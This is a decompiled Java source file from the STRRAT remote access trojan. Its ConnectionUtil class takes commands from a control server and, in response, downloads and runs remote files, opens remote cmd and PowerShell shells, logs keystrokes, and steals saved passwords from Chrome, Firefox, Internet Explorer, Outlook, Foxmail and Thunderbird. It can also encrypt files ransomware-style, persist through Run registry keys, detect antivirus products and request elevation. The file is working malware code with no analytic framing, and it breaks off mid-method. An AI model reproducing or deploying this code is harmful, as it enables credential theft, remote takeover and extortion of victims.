package carLambo;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.Shell32;
import com.sun.jna.platform.win32.ShlObj;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.Robot;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.util.Map;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.bind.DatatypeConverter;

public class ConnectionUtil {
   private static getDelayBetweenLastUserInput delayBetweenLastUserInput;
   private static String socketAddressCopy = null;
   static boolean isConnectedWithServer;
   private static Socket socket;
   private static String someEmptyString;
   public static String localAddress = "127.0.0.1";
   private static String sbsbgsrg;
   public static String socketAddress = "127.0.0.1";
   private static Random random;
   private static int socketPortCopy = 0;
   private static OutputStream socketOutputStream;
   static String appdataRoaming;
   public static int gsbthstgb = 7788;
   private static String socketSeparator = "|";
   private static InputStream socketInputStream;
   public static String roamingStrlogs;
   public static int socketPort = 7788;

   // $FF: synthetic method
   public static String someSystemInfo() {
      ProcessBuilder var0;
      (var0 = new ProcessBuilder(new String[]{"cmd.exe", "/c", "wmic /node:. /namespace:'\\\\root\\cimv2' path win32_operatingsystem get version /format:list"})).redirectErrorStream(true);
      StringBuilder var1 = new StringBuilder();

      String var2;
      Process var6;
      BufferedReader var7;
      try {
         var6 = var0.start();
         var7 = new BufferedReader(new InputStreamReader(var6.getInputStream()));

         while((var2 = var7.readLine()) != null) {
            var1.append(var2);
         }
      } catch (IOException var5) {
         var5.printStackTrace();
      }

      String var8;
      if (Integer.parseInt((var8 = var1.toString().trim().split("=")[1]).trim().substring(0, var8.indexOf("."))) > 6) {
         var8 = "securitycenter2";
      } else {
         var8 = "securitycenter";
      }

      (var0 = new ProcessBuilder(new String[]{"cmd.exe", "/c", "wmic /node:localhost /namespace:'\\\\root\\" + var8 + "' path antivirusproduct get displayname /format:list"})).redirectErrorStream(true);
      var1 = new StringBuilder();

      try {
         var6 = var0.start();
         var7 = new BufferedReader(new InputStreamReader(var6.getInputStream()));

         while((var2 = var7.readLine()) != null) {
            var1.append(var2);
         }
      } catch (IOException var4) {
         var4.printStackTrace();
      }

      try {
         var8 = var1.toString().trim().split("=")[1];
         return var8;
      } catch (Exception var3) {
         return "nan-av";
      }
   }

   public static void sendMessageToSocket(String message) {
      String var1 = String.valueOf(message.getBytes().length + "\r\n\r\n");
      try {
         socketOutputStream.write(var1.getBytes());
         socketOutputStream.write(message.getBytes());
         socketOutputStream.flush();
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

   }

   // $FF: synthetic method
   private static void sdfsldf(String var0, String var1) {
      try {
         File var6;
         Socket var8;
         if ((var6 = new File(var0)).exists() && (var8 = sendSocketMessage(var1)).isConnected()) {
            FileInputStream var7 = new FileInputStream(var6);
            byte[] var2 = new byte[8192];
            OutputStream var4 = var8.getOutputStream();

            int var3;
            while((var3 = var7.read(var2, 0, 8192)) != -1) {
               var4.write(var2, 0, var3);
               var4.flush();
            }

            var7.close();
            var4.close();
            var8.close();
            return;
         }
      } catch (Exception var5) {
         ;
      }

   }

   // $FF: synthetic method
   private static boolean ertdbdth() {
      File var0;
      if (!(var0 = new File(roamingStrlogs)).exists()) {
         var0.mkdir();
      }

      random = new Random();
      return true;
   }

   public static String getUserName() {
      Map var0;
      return (var0 = System.getenv()).containsKey("USERNAME") ? (String)var0.get("USERNAME") : "Unknown";
   }

   // $FF: synthetic method
   private static void executeFileFromSocket(String link, String name) {
      try {
         BufferedInputStream var6 = new BufferedInputStream((new URL(link)).openStream());
         FileOutputStream var2 = new FileOutputStream((new StringBuilder()).insert(0, appdataRoaming).append(name).toString());
         byte[] var3 = new byte[1024];
         BufferedInputStream var10000 = var6;

         int var4;
         while((var4 = var10000.read(var3, 0, 1024)) != -1) {
            var10000 = var6;
            var2.write(var3, 0, var4);
         }

         var6.close();
         var2.close();
         String var7 = (new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(File.separator).append("bin").append(File.separator).append("java.exe\" -jar ").toString();
         String var8;
         if (!(var8 = name.substring(name.lastIndexOf(".")).toLowerCase()).equals(".vbs") && !var8.equals(".js") && !var8.equals(".wsf")) {
            if (var8.equals(".jar")) {
               Runtime.getRuntime().exec((new StringBuilder()).insert(0, var7).append("\"").append(appdataRoaming).append(name).append("\"").toString());
            } else {
               Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd.exe /c \"").append(appdataRoaming).append(name).append("\"").toString());
            }
         } else {
            Runtime.getRuntime().exec(new String[]{"wscript", appdataRoaming + name});
         }

         sendUpdateToSocket("Executed File");
      } catch (Exception var5) {
         System.out.println(var5.getMessage());
      }
   }

   public static void connectToServer(String[] conString, LockFile lockFile) {
      try {
         File roamingLogs;
         if (!(roamingLogs = new File(roamingStrlogs)).exists()) {
            roamingLogs.mkdir();
         }

         random = new Random();
         delayBetweenLastUserInput = new getDelayBetweenLastUserInput();
         connectToSocket();
         (new Thread(new SocketKeepAliveSender())).start();
         String var2 = (new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(File.separator).append("bin").append(File.separator).append("java.exe\" -jar ").toString();

         while(isConnectedWithServer) {
            try {
               String[] serverResponse;
               if ((serverResponse = readDataFromSocket(getInputData()).split("\\|"))[0].equals("reboot")) {
                  Runtime.getRuntime().exec("cmd.exe /c shutdown /r /t 0");
               } else if (serverResponse[0].equals("shutdown")) {
                  Runtime.getRuntime().exec("cmd.exe /c shutdown /s /t 0");
               } else if (serverResponse[0].equals("uninstall")) {
                  uninstallMalware(conString);
               } else if (serverResponse[0].equals("disconnect")) {
                  isConnectedWithServer = false;
                  socket.close();
                  System.exit(0);
               } else if (serverResponse[0].equals("down-n-exec")) {
                  executeFileFromSocket(serverResponse[1], serverResponse[1].substring(serverResponse[1].lastIndexOf("/") + 1));//link, name of file
                  Thread.sleep(3000L);
                  sendUpdateToSocket("Ready");
               } else if (serverResponse[0].equals("update")) {
                  roamingLogs = updateMalware(serverResponse[1]);
                  lockFile.releaseAndClose();
                  Runtime.getRuntime().exec((new StringBuilder()).insert(0, var2).append("\"").append(roamingLogs.getAbsolutePath()).append("\"").toString());
                  uninstallMalware(conString);
               } else if (serverResponse[0].equals("up-n-exec")) {
                  String var5;
                  if (!(var5 = (roamingLogs = updateMalware(serverResponse[1])).getName().substring(roamingLogs.getName().lastIndexOf(".")).toLowerCase()).equals(".vbs") && !var5.equals(".js") && !var5.equals(".wsf")) {
                     if (var5.equals(".jar")) {
                        Runtime.getRuntime().exec((new StringBuilder()).insert(0, var2).append("\"").append(roamingLogs.getAbsolutePath()).append("\"").toString());
                     } else {
                        Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd.exe /c \"").append(roamingLogs.getAbsolutePath()).append("\"").toString());
                     }
                  } else {
                     Runtime.getRuntime().exec(new String[]{"wscript", roamingLogs.getAbsolutePath()});
                  }

                  sendUpdateToSocket("Executed File");
                  Thread.sleep(3000L);
                  sendUpdateToSocket("Ready");
               } else {
                  Socket socket;
                  if (serverResponse[0].equals("remote-cmd")) {
                     socket = sendSocketMessage((new StringBuilder()).insert(0, "remote-cmd|").append(getComputerName()).append("|").append(getUserName()).toString());
                     new dgdfndnbcn(socket, new String[]{"cmd.exe"});
                     sendUpdateToSocket("Ready");
                  } else if (serverResponse[0].equals("power-shell")) {
                     socket = sendSocketMessage((new StringBuilder()).insert(0, "power-shell|").append(getComputerName()).append("|").append(getUserName()).toString());
                     new dgdfndnbcn(socket, new String[]{"powershell.exe", "-"});
                     sendUpdateToSocket("Ready");
                  } else if (serverResponse[0].equals("file-manager")) {
                     socket = sendSocketMessage((new StringBuilder()).insert(0, "file-manager|").append(FileManager.sdfsldf()).toString());
                     new FileManager(socket);
                     sendUpdateToSocket("Ready");
                  } else if (serverResponse[0].equals("keylogger")) {
                     if (!KeyLogger.isEnabled) {
                        socket = sendSocketMessage((new StringBuilder()).insert(0, "keylogger|").append(getComputerName()).append("|").append(getUserName()).toString());
                        new KeyLogger(socket, (String)null);
                     } else {
                        KeyLogger.isEnabled = false;
                        sendUpdateToSocket("Try Again");
                     }
                  } else {
                     String var11;
                     if (serverResponse[0].equals("o-keylogger")) {
                        if (!KeyLogger.offlineKeylogger) {
                           var11 = (new StringBuilder()).insert(0, roamingStrlogs).append("keylogs_").append(String.valueOf(random.nextInt(9999))).append(".html").toString();
                           new KeyLogger((Socket)null, var11);
                           sendUpdateToSocket("Offline Keylogger Started");
                        } else {
                           KeyLogger.offlineKeylogger = false;
                           sendUpdateToSocket("Try Again");
                        }
                     } else if (serverResponse[0].equals("processes")) {
                        socket = sendSocketMessage((new StringBuilder()).insert(0, "processes%%").append(ProcessManager.sdfsldf()).toString());
                        new ProcessManager(socket);
                        sendUpdateToSocket("Ready");
                     } else {
                        Socket var10;
                        if (serverResponse[0].equals("h-browser")) {
                           var11 = (new StringBuilder()).insert(0, getComputerName()).append("\\").append(getUserName()).toString();
                           var10 = sendSocketMessage((new StringBuilder()).insert(0, "open-hbrowser%%").append(var11).append("%%").append(BrowserManager.sdfsldf()).toString());
                           new BrowserManager(var10);
                           sendUpdateToSocket("Ready");
                        } else if (serverResponse[0].equals("startup-list")) {
                           socket = sendSocketMessage((new StringBuilder()).insert(0, "startup-list%%").append(StartupManager.sdfsldf()).toString());
                           new StartupManager(socket);
                           sendUpdateToSocket("Ready");
                        } else if (serverResponse[0].equals("remote-screen")) {
                           socket = sendSocketMessage("remote-screen");
                           new RemoteScreenManager(socket);
                           sendUpdateToSocket("Ready");
                        } else if (serverResponse[0].equals("rev-proxy")) {
                           new ReverseProxyManager(serverResponse[1]);
                           sendUpdateToSocket("Ready");
                        } else if (serverResponse[0].equals("hrdp-new")) {
                           new RDPManager((String)null);
                           sendUpdateToSocket("Ready");
                        } else if (serverResponse[0].equals("hrdp-res")) {
                           new RDPManager(serverResponse[1]);
                           sendUpdateToSocket("Ready");
                        } else if (serverResponse[0].equals("chrome-pass")) {
                           PasswordStealer passwordStealer = new PasswordStealer();
                           sendMessageToSocket((new StringBuilder()).insert(0, "chrome-pass|").append(getComputerName()).append("|").append(getUserName()).append("|").append(passwordStealer.wrapStealPasswords()).toString());
                           sendUpdateToSocket("Ready");
                        } else if (serverResponse[0].equals("foxmail-pass")) {
                           JarDownloader var13 = new JarDownloader();
                           sendMessageToSocket((new StringBuilder()).insert(0, "foxmail-pass|").append(getComputerName()).append("|").append(getUserName()).append("|").append(var13.stealFoxPasswords()).toString());
                           sendUpdateToSocket("Ready");
                        } else if (serverResponse[0].equals("outlook-pass")) {
                           sendMessageToSocket((new StringBuilder()).insert(0, "outlook-pass|").append(getComputerName()).append("|").append(getUserName()).append("|").append((new SomePasswordStealer()).sdfsldf()).toString());
                           sendUpdateToSocket("Ready");
                        } else {
                           dncbnf var14;
                           if (serverResponse[0].equals("fox-pass")) {
                              if ((var14 = new dncbnf(false)).sabretb) {
                                 sdfsldf(var14.sdfsldf, (new StringBuilder()).insert(0, "fox-dec-files|").append(getComputerName()).append("|").append(getUserName()).toString());
                                 (new File(var14.sdfsldf)).delete();
                                 sendUpdateToSocket("Ready");
                              } else {
                                 sendUpdateToSocket("Firefox Not Installed");
                              }
                           } else if (serverResponse[0].equals("tb-pass")) {
                              if ((var14 = new dncbnf(true)).sabretb) {
                                 sdfsldf(var14.sdfsldf, (new StringBuilder()).insert(0, "tb-dec-files|").append(getComputerName()).append("|").append(getUserName()).toString());
                                 (new File(var14.sdfsldf)).delete();
                                 sendUpdateToSocket("Ready");
                              } else {
                                 sendUpdateToSocket("Thunderbird Not Installed");
                              }
                           } else if (serverResponse[0].equals("ie-pass")) {
                              InternetExplorerStealer passwordStealer = new InternetExplorerStealer();
                              sendMessageToSocket((new StringBuilder()).insert(0, "ie-pass|").append(getComputerName()).append("|").append(getUserName()).append("|").append(passwordStealer.stealedPasswords).toString());
                              sendUpdateToSocket("Ready");
                           } else if (!serverResponse[0].equals("all-pass") && !serverResponse[0].equals("save-all-pass")) {
                              if (serverResponse[0].equals("chk-priv")) {
                                 if (hasAdminPriveleges()) {
                                    sendUpdateToSocket("Privilege: Admin");
                                 } else {
                                    sendUpdateToSocket("Privilege: User");
                                 }
                              } else if (serverResponse[0].equals("req-priv")) {
                                 lockFile.releaseAndClose();
                                 if (sstydgn()) {
                                    System.exit(0);
                                 } else {
                                    lockFile.buildFiles();
                                    sendUpdateToSocket("Permission Denied");
                                 }
                              } else {
                                 FileEncryptManager fileEncryptManager;
                                 if (serverResponse[0].equals("rw-encrypt")) {
                                    fileEncryptManager = new FileEncryptManager(serverResponse[1]);
                                    (new Thread(new FileEncryptorThread(fileEncryptManager))).start();
                                    sendUpdateToSocket("Encrypting Files");
                                 } else if (serverResponse[0].equals("rw-decrypt")) {
                                    fileEncryptManager = new FileEncryptManager(serverResponse[1]);
                                    (new Thread(new FileDecryptorThread(fileEncryptManager))).start();
                                    sendUpdateToSocket("Decrypting Files");
                                 } else if (serverResponse[0].equals("show-msg")) {
                                    var11 = (new StringBuilder()).insert(0, System.getProperty("user.home")).append(File.separator).append("Desktop").append(File.separator).append("crimson_info.txt").toString();
                                    FileWriter var19 = new FileWriter(var11);
                                    var19.write(serverResponse[1]);
                                    var19.close();
                                    Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd.exe /c notepad \"").append(var11).append("\"").toString());
                                    sendUpdateToSocket("Ready");
                                 } else if (serverResponse[0].equals("screen-on")) {
                                    (new Thread(new MouseResetThread())).start();
                                    sendUpdateToSocket("Activated");
                                 }
                              }
                           } else {
                              StringBuilder var16 = new StringBuilder();
                              var16.append("Internet Explorer / Edge\r\n=============================\r\n\r\n");
                              var16.append((new InternetExplorerStealer()).stealedPasswords + "\r\n\r\nGoogle Chrome\r\n======================\r\n\r\n");
                              var16.append((new StringBuilder()).insert(0, (new PasswordStealer()).wrapStealPasswords()).append("\r\n\r\nFoxMail\r\n======================\r\n\r\n").toString());
                              var16.append((new StringBuilder()).insert(0, (new JarDownloader()).stealFoxPasswords()).append("\r\n\r\nOutlook Mail\r\n======================\r\n\r\n").toString());
                              var16.append((new SomePasswordStealer()).sdfsldf());
                              boolean saveAllPass = serverResponse[0].equals("save-all-pass");
                              StringBuilder var10002 = new StringBuilder();
                              if (saveAllPass) {
                                 sendMessageToSocket(var10002.insert(0, "save-all-pass|").append(getComputerName()).append("|").append(getUserName()).append("|").append(var16.toString()).toString());
                                 sendUpdateToSocket("Ready");
                              } else {
                                 var10 = sendSocketMessage(var10002.insert(0, serverResponse[0]).append("%%").append(getComputerName()).append("%%").append(getUserName()).append("%%").append(var16.toString()).toString());
                                 if ((var14 = new dncbnf(false)).sabretb) {
                                    sdfsldf(var14.sdfsldf, var10);
                                    (new File(var14.sdfsldf)).delete();
                                 } else {
                                    sdfsldf("Firefox Not Installed", var10);
                                 }

                                 Socket var18;
                                 if ((var14 = new dncbnf(true)).sabretb) {
                                    var18 = var10;
                                    sdfsldf(var14.sdfsldf, var10);
                                    (new File(var14.sdfsldf)).delete();
                                 } else {
                                    sdfsldf("Thunderbird Not Installed", var10);
                                    var18 = var10;
                                 }

                                 var18.close();
                                 sendUpdateToSocket("Ready");
                              }
                           }
                        }
                     }
                  }
               }

               System.out.println(serverResponse);
               Thread.sleep(100L);
            } catch (Exception var7) {
               System.out.println((new StringBuilder()).insert(0, "ERR:").append(var7.getMessage()).toString());
               var7.printStackTrace();
               Thread.sleep(1000L);
            }
         }

         System.out.println("DONE");
      } catch (Exception var8) {
         System.out.println(var8.getMessage());
      }
   }

   // $FF: synthetic method
   private static void sbsgssdfg() {
      StringBuilder var10000 = (new StringBuilder()).insert(0, "ping|");
      String var2;
      if (someEmptyString.equals("")) {
         someEmptyString = (new StringBuilder()).insert(0, getDiskSerialNumber()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(getComputerName()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(getUserName()).append(socketSeparator).toString();
         String[] systemInfo = getSystemVersion();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(systemInfo[0]).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(systemInfo[1]).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(someSystemInfo()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append("[win_title]").toString();
         if (FileEncryptManager.isDocumentsEndsWithCrimson()) {
            var2 = "Installed";
         } else {
            var2 = "Not Installed";
         }

         someEmptyString = (new StringBuilder()).insert(0, "STRRAT").append(socketSeparator).append(someEmptyString).append(socketSeparator).append("1.4").append(socketSeparator).append(nndfdffd()).append(socketSeparator).append(var2).append(socketSeparator).append("[idle_time]").toString();
      }

      var2 = var10000.append(someEmptyString.replace("[idle_time]", delayBetweenLastUserInput.lastUserInput()).replace("[win_title]", currentWindowName())).toString();
      String var1 = String.valueOf(var2.getBytes().length + "\r\n\r\n");
      try {
         socketOutputStream.write(var1.getBytes());
         socketOutputStream.write(var2.getBytes());
         socketOutputStream.flush();
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

   }

   // $FF: synthetic method
   private static String getDiskSerialNumber() {
      try {
         return (new DiskUtil()).getSerialNumber();
      } catch (Exception var0) {
         return "null";
      }
   }

   public static String getComputerName() {
      Map var0;
      if ((var0 = System.getenv()).containsKey("COMPUTERNAME")) {
         return (String)var0.get("COMPUTERNAME");
      } else {
         return var0.containsKey("HOSTNAME") ? (String)var0.get("HOSTNAME") : "Unknown";
      }
   }

   // $FF: synthetic method
   static void reconnectToSocket() {
      connectToSocket();
   }

   // $FF: synthetic method
   private static String readDataFromSocket(int var0) {
      byte[] var1 = new byte[var0];
      StringBuilder var3 = new StringBuilder();
      int var4 = 0;
      int var2 = var0;

      for(int var10000 = 0; var10000 != var0; var10000 = var4) {
         try {
            var2 = socketInputStream.read(var1, 0, var2);

         } catch (Exception e) {
            throw new RuntimeException(e);
         }
         var4 += var2;
         if (var2 == -1) {
            throw new RuntimeException();
         }

         var3.append(new String(var1, 0, var2));
         var2 = var0 - var4;
      }

      return var3.toString();
   }

   // $FF: synthetic method
   private static boolean hasAdminPriveleges() {
      try {
         FileWriter var10000 = new FileWriter("C:\\Windows\\System32\\config\\dummy.log");
         var10000.write("1:2");
         var10000.close();
         return true;
      } catch (Exception var0) {
         return false;
      }
   }

   // $FF: synthetic method
   static void moveMouse() {
      try {
         Robot var0 = new Robot();

         while(isConnectedWithServer) {
            Point var1 = MouseInfo.getPointerInfo().getLocation();
            var0.mouseMove(var1.x, var1.y);
            System.out.println("Mouse Moved!!");
            Thread.sleep(300000L);
         }
      } catch (Exception var2) {
         ;
      }

   }

   // $FF: synthetic method
   private static void connectToSocket() {
      while(true) {
         try {
            if (socket != null) {
               try {
                  socket.close();
                  socketInputStream.close();
                  socketOutputStream.close();
                  socket = null;
               } catch (Exception var4) {
                  var4.printStackTrace();
               }
            }

            socketInputStream = (socket = new Socket(socketAddress, socketPort)).getInputStream();
            socketOutputStream = socket.getOutputStream();
            socketAddressCopy = socketAddress;
            socketPortCopy = socketPort;
            return;
         } catch (Exception var5) {
            try {
               if (socket != null) {
                  try {
                     socket.close();
                     socketInputStream.close();
                     socketOutputStream.close();
                     socket = null;
                  } catch (Exception var2) {
                     ;
                  }
               }

               socketInputStream = (socket = new Socket(localAddress, gsbthstgb)).getInputStream();
               socketOutputStream = socket.getOutputStream();
               socketAddressCopy = localAddress;
               socketPortCopy = gsbthstgb;
               return;
            } catch (Exception var3) {
               System.out.println("reconnecting...");

               try {
                  Thread.sleep(5000L);
               } catch (InterruptedException var1) {
                  Logger.getLogger(ConnectionUtil.class.getName()).log(Level.SEVERE, (String)null, var1);
               }
            }
         }
      }
   }

   // $FF: synthetic method
   private static void sdfsldf(String var0, Socket var1) {
      try {
         File var2;
         if (!(var2 = new File(var0)).exists()) {
            OutputStream var10 = var1.getOutputStream();
            var10.write((var0 + "\r\n\r\n").getBytes());
            var10.flush();
            return;
         }

         String var3 = (new StringBuilder()).insert(0, String.valueOf(var2.length())).append("\r\n\r\n").toString();
         Socket var6 = var1;
         if (var1.isConnected()) {
            FileInputStream var8 = new FileInputStream(var2);
            byte[] var9 = new byte[8192];
            OutputStream var4 = var6.getOutputStream();
            FileInputStream var10000 = var8;
            var4.write(var3.getBytes());

            int var7;
            while((var7 = var10000.read(var9, 0, 8192)) != -1) {
               var4.write(var9, 0, var7);
               var4.flush();
               var10000 = var8;
            }

            var8.close();
            return;
         }
      } catch (Exception var5) {
         ;
      }

   }

   public static String[] getSystemVersion() {
      ProcessBuilder var0;
      (var0 = new ProcessBuilder(new String[]{"cmd.exe", "/c", "wmic /node:. /namespace:'\\\\root\\cimv2' path win32_operatingsystem get caption,OSArchitecture /format:list"})).redirectErrorStream(true);
      StringBuilder var1 = new StringBuilder();

      try {
         Process var3 = var0.start();
         BufferedReader var6 = new BufferedReader(new InputStreamReader(var3.getInputStream()));

         String var2;
         while((var2 = var6.readLine()) != null) {
            var1.append(var2 + "\r\n");
         }
      } catch (IOException var5) {
         var5.printStackTrace();
      }

      String[] var10 = var1.toString().trim().split("\r\n");
      String[] var7 = new String[]{"", ""};
      String[] var8 = var10;
      int var9 = var10.length;

      int var11;
      for(int var10000 = var11 = 0; var10000 < var9; var10000 = var11) {
         String[] var4;
         if ((var4 = var8[var11].split("="))[0].toLowerCase().equals("caption")) {
            var7[0] = var4[1].trim();
         }

         if (var4[0].toLowerCase().equals("osarchitecture")) {
            var7[1] = var4[1].trim();
         }

         ++var11;
      }

      return var7;
   }

   // $FF: synthetic method
   private static void sgsfghhg() {
      try {
         Robot var0 = new Robot();

         while(isConnectedWithServer) {
            Point var1 = MouseInfo.getPointerInfo().getLocation();
            var0.mouseMove(var1.x, var1.y);
            System.out.println("Mouse Moved!!");
            Thread.sleep(300000L);
         }
      } catch (Exception var2) {
         ;
      }

   }

   // $FF: synthetic method
   private static String nndfdffd() {
      try {
         final Socket socket = new Socket("ip-api.com", 80);
         final String s = "GET /json/ HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\r\nConnection: close\r\n\r\n";
         final Socket socket2 = socket;
         final OutputStream outputStream = socket2.getOutputStream();
         final int n = 1;
         final OutputStream outputStream2 = outputStream;
         outputStream2.write(s.getBytes());
         outputStream2.flush();
         byte[] array = new byte[n];
         StringBuilder sb = new StringBuilder();
         final InputStream inputStream = socket2.getInputStream();
         while (true) {
            int read;
            while ((read = inputStream.read(array, 0, 1)) != -1) {
               final StringBuilder sb2 = sb;
               sb2.append(new String(array, 0, read));
               if (sb2.toString().endsWith("\r\n\r\n")) {
                  sb = new StringBuilder();
                  array = new byte[1024];
                  InputStream inputStream2 = inputStream;
                  int read2;
                  while ((read2 = inputStream2.read(array, 0, array.length)) != -1) {
                     sb.append(new String(array, 0, read2));
                     inputStream2 = inputStream;
                  }
                  final StringBuilder sb3 = sb;
                  final OutputStream outputStream3 = outputStream;
                  final InputStream inputStream3 = inputStream;
                  socket.close();
                  inputStream3.close();
                  outputStream3.close();
                  if (!sb3.toString().equals("")) {
                     String str = "01";
                     String str2 = "Unknown";
                     final String string = sb.toString();
                     Label_0238: {
                        try {
                           final String s2 = string;
                           str = s2.substring(s2.indexOf("countryCode") + 14);
                           final int beginIndex = 0;
                           final String s3 = str;
                           str = s3.substring(beginIndex, s3.indexOf("\""));
                           final String s4 = string;
                           break Label_0238;
                        }
                        catch (Exception ex) {
                           final String s4 = string;
                        }
                        try {
                           final String s4 = string;
                           str2 = s4.substring(string.indexOf("country") + 10);
                           final int beginIndex2 = 0;
                           final String s5 = str2;
                           str2 = s5.substring(beginIndex2, s5.indexOf("\""));
                        }
                        catch (Exception ex2) {}
                     }
                     return new StringBuilder().insert(0, str).append(":").append(str2).toString();
                  }
                  return "01:Unknown";
               }
            }
            socket.close();
            InputStream inputStream2 = inputStream;
            continue;
         }
      }
      catch (Exception ex3) {
         return "01:Unknown";
      }
   }

   public static String currentWindowName() {
      try {
         char[] var0 = new char[2048];
         HWND var1 = com.sun.jna.platform.win32.User32.INSTANCE.GetForegroundWindow();
         com.sun.jna.platform.win32.User32.INSTANCE.GetWindowText(var1, var0, 1024);
         return DatatypeConverter.printBase64Binary(Native.toString(var0).getBytes());
      } catch (Exception var2) {
         return "";
      }
   }

   public static String connectAndGet(String link) {
      try {
         System.out.println("connectAndGet try with value: " + link);
         if (!link.startsWith("http://") && !link.startsWith("https://")) {
            return link;
         } else {
            HttpURLConnection url = (HttpURLConnection)(new URL(link)).openConnection();
            url.setRequestMethod("GET");
            url.setDoInput(true);
            url.setDoOutput(true);
            url.connect();
            if (url.getResponseCode() != 200) {
               return link;
            } else {
               InputStream var2 = url.getInputStream();
               byte[] var3 = new byte[1024];
               StringBuilder returnedValue = new StringBuilder();

               int var5;
               for(InputStream var7 = var2; (var5 = var7.read(var3, 0, 1024)) != -1; var7 = var2) {
                  returnedValue.append(new String(var3, 0, var5));
               }

               var2.close();
               url.disconnect();
               System.out.println("connectAndGet returnedValue: " + returnedValue);
               return returnedValue.toString();
            }
         }
      } catch (Exception var6) {
         var6.printStackTrace();
         return link;
      }
   }

   // $FF: synthetic method
   private static String bsgshsbs(String var0) {
      return DatatypeConverter.printBase64Binary(var0.getBytes());
   }

   // $FF: synthetic method
   private static void uninstallMalware(String[] var0) {
      if (var0 != null && var0.length == 0) {
         try {
            Runtime.getRuntime().exec("cmd /c schtasks /delete /tn skype /f");

         } catch (Exception e) {
            throw new RuntimeException(e);
         }
      }

      String var5 = Main.getCurrentFile();
      File var1;
      var5 = (var1 = new File(var5)).getName();
      File var2 = new File((new StringBuilder()).insert(0, sdfsldf(7)).append("\\").append(var1.getName()).toString());
      File var3 = new File((new StringBuilder()).insert(0, sdfsldf(24)).append("\\").append(var1.getName()).toString());
      var5 = var5.substring(0, var5.lastIndexOf("."));
      var2.delete();
      try {
         Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd /c ping localhost -n 6 > nul && del \"").append(var1.getAbsolutePath()).append("\" /f").toString());
      } catch (IOException e) {
         e.printStackTrace();
      }

      try {
         WindowsRegUtil.sabretb(-2147483647, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", var5, 0);
         var3.delete();
         WindowsRegUtil.sabretb(-2147483646, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", var5, 0);
      } catch (Exception var4) {
         ;
      }

      System.exit(0);
   }

   public static void sendUpdateToSocket(String message) {
      sendMessageToSocket((new StringBuilder()).insert(0, "update-status|").append(message).toString());
   }

   // $FF: synthetic method
   static void setWindowsRegisters() {
      String var0;
      String var10000;
      String var1;
      label27: {
         var0 = (new File(Main.getCurrentFile())).getName();
         var1 = sdfsldf(7);
         File var4;
         if (!(var4 = new File((new StringBuilder()).insert(0, var1).append(File.separator).append(var0).toString())).exists()) {
            label25: {
               try {
                  StartupManager.copyFiles(new File(Main.getCurrentFile()), var4);
               } catch (Exception var3) {
                  var3.printStackTrace();
                  break label25;
               }

               var10000 = var0;
               break label27;
            }
         }

         var10000 = var0;
      }

      var1 = var10000.substring(0, var0.lastIndexOf("."));

      try {
         if (WindowsRegUtil.invokeMethod(-2147483647, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", var1, 0) == null) {
            var0 = (new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(File.separator).append("bin").append(File.separator).append("javaw.exe\" -jar \"").append(Main.getCurrentFile()).append("\"").toString();
            WindowsRegUtil.invokeMethod(-2147483647, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", var1, var0, 0);
            WindowsRegUtil.invokeMethod(-2147483646, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", var1, var0, 0);
            return;
         }
      } catch (Exception var2) {
         var2.printStackTrace();
      }

   }

   // $FF: synthetic method
   private static void mdgghtdsh() {
      String var0;
      String var10000;
      String var1;
      label27: {
         var0 = (new File(Main.getCurrentFile())).getName();
         var1 = sdfsldf(7);
         File var4;
         if (!(var4 = new File((new StringBuilder()).insert(0, var1).append(File.separator).append(var0).toString())).exists()) {
            label25: {
               try {
                  StartupManager.copyFiles(new File(Main.getCurrentFile()), var4);
               } catch (Exception var3) {
                  var3.printStackTrace();
                  break label25;
               }

               var10000 = var0;
               break label27;
            }
         }

         var10000 = var0;
      }

      var1 = var10000.substring(0, var0.lastIndexOf("."));

      try {
         if (WindowsRegUtil.invokeMethod(-2147483647, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", var1, 0) == null) {
            var0 = (new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(File.separator).append("bin").append(File.separator).append("javaw.exe\" -jar \"").append(Main.getCurrentFile()).append("\"").toString();
            WindowsRegUtil.invokeMethod(-2147483647, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", var1, var0, 0);
            WindowsRegUtil.invokeMethod(-2147483646, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", var1, var0, 0);
            return;
         }
      } catch (Exception var2) {
         var2.printStackTrace();
      }

   }

   // $FF: synthetic method
   private static boolean sstydgn() {
      try {
         String var0 = (new StringBuilder()).insert(0, "Start-Process '").append(System.getProperty("java.home")).append("\\bin\\javaw.exe' -argumentlist '-jar ").append(Main.getCurrentFile()).append("' -verb runAs").toString();
         ProcessBuilder var4;
         (var4 = new ProcessBuilder(new String[]{"powershell", var0})).redirectErrorStream(true);
         Process var5 = var4.start();
